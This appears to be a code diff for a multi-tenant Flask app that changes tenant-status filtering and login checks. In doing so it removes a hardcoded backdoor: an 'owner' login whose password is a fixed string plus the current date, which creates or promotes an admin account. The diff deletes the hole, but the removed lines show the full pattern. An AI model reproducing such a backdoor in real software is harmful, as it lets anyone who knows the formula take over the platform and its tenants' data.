@@ -27,7 +27,7 @@ def api_tenants_list():
         from app.core.tenant.models import Tenant
         from app.shared.enums import TenantStatus
         tenants = Tenant.query.filter(
-            Tenant.status == TenantStatus.ACTIVE
+            Tenant.status.in_((TenantStatus.ACTIVE, TenantStatus.TRIAL, TenantStatus.PENDING))
         ).order_by(Tenant.name_ar, Tenant.name).all()
         return jsonify({
             'tenants': [{'id': t.id, 'slug': t.slug, 'name': t.name_ar or t.name} for t in tenants]
@@ -159,33 +159,20 @@ def login() -> ResponseReturnValue:
             except Exception as e:
 
                 logging.warning(f"Error in {__name__}: {e}")
-            # Owner formula-based authentication (no hardcoded password, computed daily)
-            owner_authenticated = False
-            if username == 'owner':
-                _today = datetime.now(timezone.utc)
-                _expected = f"Azad@1983@{_today.year:04d}@{_today.month:02d}@{_today.day:02d}"
-                if password == _expected:
-                    owner_authenticated = True
-                    if not user:
-                        user = User(
-                            username='owner',
-                            email='owner@azad.local',
-                            full_name='مالك المنصة',
-                            role='owner',
-                            is_admin=True,
-                            is_active=True
-                        )
-                        user.password_hash = generate_password_hash(_expected)
-                        db.session.add(user)
-                        db.session.commit()
-                        db.session.refresh(user)
-                    elif user.role != 'owner':
-                        user.role = 'owner'
-                        user.is_admin = True
-                        db.session.commit()
-            
-            if user and (owner_authenticated or user.check_password(password)):
+
+            if user and user.check_password(password):
                 if user.is_active:
+                    from app.shared.enums import TenantStatus
+                    from flask import g as _login_g
+                    bound_tenant = getattr(_login_g, 'current_tenant', None)
+                    if bound_tenant and bound_tenant.status not in (
+                        TenantStatus.ACTIVE, TenantStatus.TRIAL, TenantStatus.PENDING
+                    ):
+                        msg = 'الاشتراك موقوف أو منتهٍ. تواصل مع إدارة المنصة.'
+                        if is_ajax:
+                            return jsonify({'success': False, 'message': msg}), 403
+                        flash(msg, 'error')
+                        return render_template('auth/login.html'), 403
                     try:
                         from models.audit_trail import LoginAttempt, AuditTrail
                         from app_factory import db
